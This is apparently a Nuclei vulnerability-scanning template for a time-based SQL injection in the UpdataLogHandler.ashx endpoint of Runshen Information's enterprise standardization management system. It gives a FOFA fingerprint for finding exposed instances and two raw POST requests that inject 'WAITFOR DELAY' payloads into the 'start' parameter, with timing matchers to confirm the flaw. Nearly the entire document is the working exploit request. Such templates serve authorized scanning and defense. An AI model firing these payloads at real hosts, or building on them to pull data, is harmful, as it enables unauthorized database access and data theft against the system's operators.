id: runshen-system-updataloghandlerashx-sqli
info:
  name: "润申信息企业标准化管理系统 UpdataLogHandler.ashx SQL 注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: "PDCA/js/_publicCom.js"
      该漏洞源于 UpdataLogHandler.ashx 处理程序未正确验证用户输入，攻击者可通过构造恶意SQL查询执行未经授权的数据库操作，可能导致敏感数据泄露或系统被控制。
  tags: 润申信息企业标准化管理系统
http:
- raw:
  - |
    POST /PDCA/ashx/UpdataLogHandler.ashx HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/x-www-form-urlencoded

    action=GetAll&start=' WAITFOR DELAY '0:0:5'--&end=&code=11&type=2&page=1&rows=20
  - |
    POST /PDCA/ashx/UpdataLogHandler.ashx HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/x-www-form-urlencoded

    action=GetAll&start=' WAITFOR DELAY '0:0:8'--&end=&code=11&type=2&page=1&rows=20
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
